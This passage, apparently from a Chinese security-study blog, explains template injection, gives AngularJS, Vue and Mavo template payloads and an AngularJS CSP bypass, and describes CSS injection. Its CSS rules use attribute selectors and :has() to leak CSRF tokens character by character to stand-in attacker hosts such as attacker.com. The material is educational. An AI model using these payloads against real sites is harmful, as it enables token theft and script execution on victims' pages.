class="hljs-string">&quot;link&quot;</span>: <span class="hljs-string">&quot;https://example.com&quot;</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;test@example.com&quot;</span><br>&#125;<br><br>template_str = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Hi, &#123;&#123;name&#125;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Do you find our product fits for your needs?</span><br><span class="hljs-string">If not, feel free to schedule a brief 10-minute online meeting with me at your convenience.</span><br><span class="hljs-string"></span><br><span class="hljs-string">You can make a reservation &lt;a href=&quot;&#123;&#123;link&#125;&#125;?q=&#123;&#123;email&#125;&#125;&quot;&gt;here&lt;/a&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Huli</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>template = Template(template_str)<br>rendered_template = template.render(<br>    name=data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>    link=data[<span class="hljs-string">&#x27;link&#x27;</span>],<br>    email=data[<span class="hljs-string">&#x27;email&#x27;</span>])<br><span class="hljs-built_in">print</span>(rendered_template)<br></code></pre></td></tr></table></figure>

<h5 id="ssti原因"><a href="#ssti原因" class="headerlink" title="ssti原因"></a>ssti原因</h5><p>将恶意输入注入到服务器端的模板渲染中，导致模板引擎执行恶意代码</p>
<p>根本原因在于对用户输入缺乏适当的验证和过滤，允许恶意代码被注入并执行  </p>
<p><strong>注意</strong>  </p>
<p><u>模板注入并不意味着“攻击者可以操纵用户提交的数据”，而是“攻击者可以操纵模板本身”。</u></p>
<p>模板注入漏洞指的是攻击者能够 <strong>修改模板的结构</strong> 或 <strong>插入恶意的模板代码</strong>，从而改变最终渲染出来的内容。模板引擎的设计通常是将 <strong>模板</strong> 和 <strong>数据</strong> 分开，模板定义了页面的结构，而数据提供了填充到模板中的具体内容。  </p>
<h4 id="前端模版-主要说-angularjs"><a href="#前端模版-主要说-angularjs" class="headerlink" title="前端模版(主要说 angularjs)"></a>前端模版(主要说 angularjs)</h4><p>是的 前端也有模版  </p>
<p>常见的前端模板引擎有：</p>
<ul>
<li><strong>Mustache</strong> 和 <strong>Handlebars</strong>（基于 Mustache 语法扩展）</li>
<li><strong>EJS</strong>（嵌入式 JavaScript 模板）</li>
<li><strong>Pug</strong>（以前叫 Jade）</li>
<li><strong>AngularJS</strong> 模板</li>
<li><strong>Vue.js</strong> 模板</li>
</ul>
<p>这里说 angularjs模版  </p>
<p>在Angular文档中， <a target="_blank" rel="noopener" href="https://angular.io/guide/security#angulars-cross-site-scripting-security-model">Angular的跨站脚本安全模型</a>中提到：</p>
<blockquote>
<p>Unlike values to be used for rendering, Angular templates are considered trusted by default, and should be treated as executable code. Never create templates by concatenating user input and template syntax. Doing this would enable attackers to inject arbitrary code into your application.<br>与用于渲染的值不同，Angular 模板默认被视为受信任，并且应被视为可执行代码。切勿通过连接用户输入和模板语法来创建模板。这样做将使攻击者能够将任意代码注入您的应用程序。</p>
</blockquote>
<p>Templates should be treated as executable code, and user control over templates should never be allowed.<br>模板应被视为可执行代码，并且绝不允许用户控制模板。</p>
<p>2010 年首次发布时，名为 AngularJS，版本号为 0.xx 或 1.xx，但版本 2 后，更名为 Angular，用法类似，但设计完全重写。我们主要参考旧版本AngularJS，因为它由于年代久远问题较多，是一个适合辅助攻击的库。  </p>
<p>当 AngularJS 首次发布时，也可以使用以下命令执行任意代码 <code>&#123;&#123; constructor.constructor('alert(1)')() &#125;&#125;</code> 。不过从1.2.0版本开始，增加了沙箱机制，以百般方式阻止对<code>window</code>的访问。但在攻击和防御方面，安全研究人员不会输，他们已经找到了绕过沙箱的方法。  </p>
<p>这种被绕过、强化沙箱、再次被绕过的循环一直持续着。最后，AngularJS 宣布在 1.6 版本之后彻底移除沙箱。原因是沙箱实际上并不是一个安全功能。如果你的模板可以被控制，那么这应该是要解决的问题，而不是沙箱。详情可参见原公告文章： <a target="_blank" rel="noopener" href="https://sites.google.com/site/bughunteruniversity/nonvuln/angularjs-expression-sandbox-bypass">AngularJS表达式沙箱绕过</a>。更多绕过历史可以在<a target="_blank" rel="noopener" href="https://portswigger.net/research/dom-based-angularjs-sandbox-escapes">基于 DOM 的 AngularJS 沙箱逃逸</a>中找到。  </p>
<p>例如下面这段例子  </p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// import required packages</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;zone.js&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; Component &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@angular/core&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; bootstrapApplication &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@angular/platform-browser&#x27;</span>;<br><br><span class="hljs-comment">// describe component</span><br>@Component(&#123;<br>  selector: <span class="hljs-string">&#x27;add-one-button&#x27;</span>, <span class="hljs-comment">// component name used in markup</span><br>  standalone: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// component is self-contained</span><br>  template: <span class="hljs-comment">// the component&#x27;s markup</span><br>  `<br>   &lt;button (click)=<span class="hljs-string">&quot;count = count + 1&quot;</span>&gt;Add one&lt;/button&gt; &#123;&#123; <span class="hljs-keyword">count</span> &#125;&#125;<br>  `,<br>&#125;)<br><br><span class="hljs-comment">// export component</span><br>export <span class="hljs-keyword">class</span> AddOneButtonComponent &#123;<br>  <span class="hljs-keyword">count</span> = <span class="hljs-number">0</span>;<br>&#125;<br><br>bootstrapApplication(AddOneButtonComponent);<br></code></pre></td></tr></table></figure>

<p>如果将<code>&#123;&#123; count &#125;&#125;</code>更改为 <code>&#123;&#123; constructor.constructor('alert(1)')() &#125;&#125;</code> ，您将看到弹出一个警报窗口  </p>
<p>**注意 **  </p>
<p><code>constructor.constructor(&#39;alert(1)&#39;)() </code>  关于这段代码的意思   </p>
<p>由于考虑安全原因 模板无法直接访问<code>window</code>对象  所以构造如上代码  </p>
<p>constructor这个东西上面有解释  </p>
<p>简单来说  </p>
<p>在 JavaScript 中，每个对象都继承自一个原型对象，而原型对象中包含一个名为 <code>constructor</code> 的属性，这个属性指向创建该对象的构造函数。每个 JavaScript 对象都会有 <code>constructor</code> 属性。  </p>
<p><code>constructor.constructor</code> 实际上是利用了 <strong><code>constructor</code> 属性</strong> 访问到的对象的构造函数，这个构造函数实际上就是 <strong><code>Function</code> 构造函数</strong>。  </p>
<p>然后就可以通过这个<code>Function</code> 构造函数来创建新的函数。  </p>
<p>例如上面 <strong>通过 <code>Function</code> 构造函数动态创建一个函数</strong>，这个函数的代码就是 <code>&#39;alert(1)&#39;</code>，也就是弹出一个警告框。</p>
<p>详细说就是 动态创建了一个匿名函数。而且这个匿名函数并没有显式的名字，它的作用只是执行传入的代码<code> alert(1)</code>  </p>
<p>最后 执行 () 来调用创建的函数  也就是弹窗1  </p>
<h5 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h5><p>在 AngularJS 1.x 版本中,只需要 添加 <code>ng-app</code> 属性 再去引用库文件就可以开始使用 避免了过多的配置步骤  </p>
<p>例如  </p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-app</span>&gt;</span></span><br><span class="language-xml">    </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;hello world&#x27;.toUpperCase</span>() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>例如，如果您的输入反映在HTML的正文中，并且正文是用ng-app:<body-ng-app>定义的，那我们可以尝试下面这些payload进行攻击：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure>

<p>VueJS同理，V3版本可使用如下payload：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_openBlock.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>V2版本使用如下payload：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>对于Mavo引擎，使用如下payload：</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">[7*7]</span><br><span class="language-xml"></span><br><span class="language-xml">[(1,alert)(1)]</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">mv-expressions</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">top.alert</span>(<span class="hljs-name">1</span>)&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">[self.alert(1)]</span><br></code></pre></td></tr></table></figure>



<h4 id="AngularJS-和-CSP-绕过"><a href="#AngularJS-和-CSP-绕过" class="headerlink" title="AngularJS 和 CSP 绕过"></a>AngularJS 和 CSP 绕过</h4><p>AngularJS 在实践中最常用于 CSP 绕过  </p>
<p>如果你在 CSP 允许的路径中找到 AngularJS 那么很有可能会绕过  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src https://cdnjs.cloudflare.com&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-app</span> <span class="hljs-attr">ng-csp</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">ng-focus</span>=<span class="hljs-string">$event.composedPath()|orderBy:</span>&#x27;(<span class="hljs-attr">z</span>=<span class="hljs-string">alert)(1)</span>&#x27;&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个路径允许我们引入 AngularJS  </p>
<p>但是csp里面没有设置 <code> unsafe-eval</code> 这个东西 意味着  <code>eval()</code> 和类似的功能将被禁止。这意味着，页面上的 JavaScript 代码不能动态地生成并执行字符串代码。</p>
<p>但是由于添加了<a target="_blank" rel="noopener" href="https://docs.angularjs.org/api/ng/directive/ngCsp">ng-csp</a>  </p>
<p>可以理解为  AngularJS 实现自己的<code>eval</code>以将字符串作为代码执行，而不使用这些默认函数。  </p>
<h2 id="css注入"><a href="#css注入" class="headerlink" title="css注入"></a>css注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_68163788/article/details/134341847">https://blog.csdn.net/qq_68163788/article/details/134341847</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_55316925/article/details/128683353?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_55316925/article/details/128683353?spm=1001.2014.3001.5502</a></p>
<h4 id="补充一下-1"><a href="#补充一下-1" class="headerlink" title="补充一下"></a>补充一下</h4><p>在跟着文章复现的时候 出现的一点问题  </p>
<p><strong>这里为了让虚拟机可以访问此页面需要在小皮上再绑定一个虚拟机网段的本机IP地址</strong>  </p>
<p>我虚拟机的网段是 192.168.206.0&#x2F;24  </p>
<p>刚开始看的时候 没太理解这句话  </p>
<p>或者说 192.168.206.132.1 192.168.206.2 192.168.206.132  </p>
<p>这三个ip地址分别是什么意思 有什么用 有点混了  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501111501897.png" srcset="/img/loading.gif" lazyload alt="image-20250111150152497"></p>
<p>简单来说是这样的  </p>
<p>但是这样也不一定  </p>
<p>比如说 我的情况就相反  </p>
<p>我的192.168.206.2 是网关地址 而 192.168.206.1 则是我物理机或者说叫宿主机在我的虚拟机那个网段的地址  </p>
<p>所以我访问192.168.206.1 跟 我访问 127.0.0.1 的效果是一样的(如果能访问的到的话)  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501111502586.png" srcset="/img/loading.gif" lazyload alt="image-20250111150242445"></p>
<p>可以去 &#x2F;etc&#x2F;resolv.conf 虚拟机这个文件查看自己的网关地址是多少    </p>
<p><strong>style标签</strong>  </p>
<style> 是HTML文档中的一个元素，它用于在HTML文档中嵌入CSS（层叠样式表）代码。  

### css  

**CSS**（Cascading Style Sheets，层叠样式表）是一种用于描述 HTML 或 XML（包括 SVG 和 XML 文档）文档外观和格式的样式语言。CSS 使得网页的结构和样式分离，允许开发者控制网页的布局、颜色、字体、间距等，增强了网页的美观性和可读性。  

虽然 CSS 主要用于设计网页样式，但它可以与两个功能结合起来窃取数据。  

第一个功能是属性选择器。  

**属性选择器**（Attribute Selector）是一种允许你根据 HTML 元素的属性及其值来选择和应用样式的选择器。属性选择器可以根据元素的某个属性的存在、属性值是否匹配特定值等进行选择，从而更加精确地应用样式。  

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">attribute</span>]<br>[<span class="hljs-meta">attribute=<span class="hljs-string">&quot;value&quot;</span></span>]<br>[<span class="hljs-meta">attribute~=<span class="hljs-string">&quot;value&quot;</span></span>]<br>[<span class="hljs-meta">attribute|=<span class="hljs-string">&quot;value&quot;</span></span>]<br>[<span class="hljs-meta">attribute^=<span class="hljs-string">&quot;value&quot;</span></span>]<br>[<span class="hljs-meta">attribute$=<span class="hljs-string">&quot;value&quot;</span></span>]<br>[<span class="hljs-meta">attribute*=<span class="hljs-string">&quot;value&quot;</span></span>]<br></code></pre></td></tr></table></figure>

![image-20250109204119112](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501092041442.png)

<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">[<span class="hljs-class"><span class="hljs-keyword">class</span>~=&quot;<span class="hljs-title">active</span>&quot;] </span>&#123;<br>    background-color: yellow;<br>&#125;<br></code></pre></td></tr></table></figure>

例如 这条 CSS 会将所有类名中包含 `active` 的元素背景设置为黄色。例如，`<div class="btn active">`  

第二个功能是css也可以发送请求  

将这两个功能结合一下 就是css注入  

CSS 注入是一种攻击方式，攻击者通过 **注入恶意 CSS 代码** 来窃取信息  

**原理**  

核心原理是利用 CSS 的属性选择器和背景图片加载机制 **配合起来泄露信息**  

举个例子  

假设网页中有一个输入框：

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;secret&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;abc123&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

这个输入框的 `value` 属性是 `abc123`，它存储了一个敏感数据（比如密码）

如果能注入css的话  

那么就可以注入如下代码  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://myserver.com?q=a</span>);<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;b&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://myserver.com?q=b</span>);<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;c&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://myserver.com?q=c</span>);<br>&#125;<br><br>// ......<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;secret&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;z&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://myserver.com?q=z</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

选择这个属性 并且开始猜测里面的value值  

当猜对的时候 会向后面的url发出请求  

而后面的url是攻击者自己控制的url  

目的就是通过判断浏览器是否向这个 URL 发出请求来判断并且获取 **输入框 `value` 属性的某些信息**  

### 两个问题  

什么数据能被盗取出来?  

上述方法只猜测并且盗取了value值里面的第一个字符 第二个如何盗取?  

#### 第一个问题  

有些"隐藏输出"就不能用上面的方法盗取出来  

由于输入类型是隐藏的，因此该元素不会显示在屏幕上。由于不显示，浏览器不需要加载背景图片，因此服务器不会收到任何请求。  

**“隐藏输入”是指在 HTML 表单中，类型为 `hidden` 的 `<input>` 元素。**  

目的就是存储数据而不让用户看到或直接操作它们  

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;csrf-token&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;abc123&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

由于hidden 所以说不能直接猜测 但是可以间接猜测  

通过注入下面的css  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;a&quot;</span>]</span> + <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=a</span>);<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;b&quot;</span>]</span> + <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=b</span>);<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;c&quot;</span>]</span> + <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=c</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

但是如果它后面没有其他元素怎么办？像这样：  

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;form action=&quot;/action&quot;&gt;<br>  &lt;<span class="hljs-keyword">input</span> <span class="hljs-type">name</span>=&quot;username&quot;&gt;<br>  &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;submit&quot;&gt;<br>  &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;csrf-token&quot; <span class="hljs-keyword">value</span>=&quot;abc123&quot;&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>

**has**  

https://developer.mozilla.org/en-US/docs/Web/CSS/:has  

即使hidden后面没有其他元素 也可以  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">form</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">&quot;a&quot;</span>]</span>) &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=a</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

利用 `:has` 选择器选择隐藏元素的父级（如 `<form>`），而父级是可见的，可以正常加载样式  

通过 `:has` 选择器，攻击者可以选择隐藏输入框的父级或祖先元素，利用可见的父元素来加载背景图片，最终向攻击者的服务器发送请求

除了上面说到的隐藏数据 不能被直接盗取之外  一些网站还将数据放入`<meta>`标签中，例如， `<meta name="csrf-token" content="abc123">` 。元标签也是不可见的元素。我们怎样才能偷走它们  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span><span class="hljs-selector-pseudo">:has</span>(meta<span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[content^=<span class="hljs-string">&quot;a&quot;</span>]</span>) &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=a</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

可以使用has  

也可以这样  

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">head, meta &#123;<br>  <span class="hljs-attribute">display</span>: block;  <br>&#125;<br><br>meta<span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[content^=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://example.com?q=a</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

使用 CSS 让meta元素可见 同时 因为`<meta>`位于`<head>`下，并且`<head>`具有默认的`display:none`属性。因此，我们还需要专门设置`<head>` ，让`<meta>` “可见”  

#### 第二个问题

如何自动盗取所有的东西 而不只是第一个字符  

关键在于使用某些自动化工具替换payload来实现自动化流程

来一个实例  

比如说 一个协作文档工具 HackMD 或者是那种在线的多人编辑工具  

支持**更新样式而不刷新**  

如何利用实时更新机制，在不刷新页面的情况下，检测或推测出页面中 **动态内容（如 CSRF 令牌）** 的变化

当文档或页面中的内容发生变化时，这些变化会直接传递给所有连接的客户端  

因此，即使页面没有刷新，CSRF 令牌的更新也会被实时同步到其他客户端  

![image-20250110150331441](https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202501101503866.png)

服务器更新 HackMD 内容并替换为有效负载以窃取第二个字符

- **含义**：攻击者利用 HackMD 的实时同步机制，通过 Puppeteer 或其他自动化工具，更新文档内容。

- 新的 CSS 有类似以下规则：

  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">meta<span class="hljs-selector-attr">[name=<span class="hljs-string">&quot;csrf-token&quot;</span>]</span><span class="hljs-selector-attr">[content^=<span class="hljs-string">&quot;ab&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://attacker.com/extract?q=ab</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

